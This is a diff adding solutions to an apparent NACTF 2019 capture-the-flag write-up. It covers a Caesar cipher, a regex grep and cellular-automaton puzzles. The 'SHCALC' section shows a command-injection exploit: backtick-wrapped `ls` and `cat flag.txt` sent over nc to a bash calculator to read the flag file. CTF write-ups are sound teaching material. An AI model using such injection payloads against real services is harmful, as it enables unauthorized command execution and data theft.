@@ -74,7 +74,7 @@ So, we can decrypt it using some online tools like [Cryptii](https://cryptii.com
 ```python
 cipher = 'ertkw{vk_kl_silkv}'
 key = ord('n') - ord('e')
-plain = ''.join([chr((ord(c)-ord('a')+9)%26+ord('a')) if (ord(c)>=ord('a') and ord(c)<=ord('z')) else c for c in cipher])
+plain = ''.join([chr((ord(c)-ord('a')+key)%26+ord('a')) if (ord(c)>=ord('a') and ord(c)<=ord('z')) else c for c in cipher])
 print(plain)
 ```
 #### Flag
@@ -459,11 +459,109 @@ $ grep -r nactf .
 
 #### Solution
 ```bash
-
+grep -e [aeiou][aeiou][aeiou][aeiou][aeiou][aeiou][aeiou]} flag.txt
 ```
 
 #### Flag
-`nactf{}`
+`nactf{r3gul4r_3xpr3ss10ns_ar3_m0r3_th4n_r3gul4r_euaiooa}`
+
+
+***
+
+## SHCALC
+
+#### Description
+> John's written a handy calculator app - in bash! Too bad it's not that secure...
+
+> Connect at nc shell.2019.nactf.com 31214
+
+#### Hint
+> Heard of injection?
+
+#### Solution
+This is code injection. So we will inject code like this:
+```bash
+$ nc shell.2019.nactf.com 31214
+shcalc v1.1
+> `ls` 
+sh: 1: arithmetic expression: expecting EOF: "calc.sh
+flag.txt"
+> `cat flag.txt`
+sh: 1: arithmetic expression: expecting EOF: "nactf{3v4l_1s_3v1l_dCf80yOo}"
+> 
+```
+
+#### Flag
+`nactf{3v4l_1s_3v1l_dCf80yOo}`
+
+
+***
+
+## Cellular Evolution #0: Bellsprout (75)
+
+#### Description
+> Vikram Loves Bio!
+He loves it so much that he started growing Cellular Automata in a little jar of his. He hopes his Cellular Automata can be as strong as HeLa Cells. He has so many cells growing that he decided to hire you to help him with his project. Can you open these files and follow Vikram's instructions?
+Use the flag format nactf{...}
+
+#### Hint
+> Its probably good practice to put all of these files inside of a folder
+
+> Cells colored white represent 0's and cells colored black represent 1's.
+
+#### File
+- [Cell.jar](cellular0/Cell.jar)
+- [inpattern.txt](cellular0/inpattern.txt)
+- [Vikrams_Instructions.txt](cellular0/ikrams_Instructions.txt)
+
+#### Solution
+In linux, run `Cell.jar` using command `java -jar Cell.jar`.
+Click **InPat**, type `E` in Program box, click **Parse**, then click **Step** 17 times. Click **OutPat**, open `outpattern.txt`, we got:
+```
+ 1 1 . 1 . . . . 1 1 . 1 1 . . . 1 1 . . . . 1 . 1 1 . . . 1 1 . 1 1 . 1 . 1 1 . 1 1 1 . . 1 1
+ ```
+Change the sequece to bit strings, and convert to ascii
+```python
+c = ' 1 1 . 1 . . . . 1 1 . 1 1 . . . 1 1 . . . . 1 . 1 1 . . . 1 1 . 1 1 . 1 . 1 1 . 1 1 1 . . 1 1'
+d = c.replace('.','0').replace(' ','')
+print(hex(int(d,2))[2:].decode('hex'))
+```
+
+#### Flag
+`nactf{hlacks}`
+
+
+***
+
+## Cellular Evolution #1: Weepinbell (125)
+
+#### Description
+> Apparently, Vikram was not satisfied with your work because he hired a new assistant: Eric. Eric has been doing a great job with managing the cells but he has allergies. Eric sneezed and accidentally messed up the order of the cells. Can you help Eric piece the cells back together?
+btw, flag is all lowercase
+
+#### Hint
+> This program is similar to Conway's "Game of Life"
+
+#### File
+- [Cell.jar](cellular1/Cell.jar)
+- [inpattern.txt](cellular1/inpattern.txt)
+- [How_to_use_cell.jar.txt](cellular1/How_to_use_cell.jar.txt)
+- [Erics_Instructions.txt](cellular1/Erics_Instructions.txt)
+
+#### Solution
+Program to Parse
+```
+NW == 4 : 3
+NE == 3 : 4
+SW == 1 : 2
+SE == 2 : 1
+ ```
+After 20 generations, we got this
+![cellular1.png](Images/cellular1.png)
+
+#### Flag
+`nactf{ie_eid_ftw}`
+
 
 
 
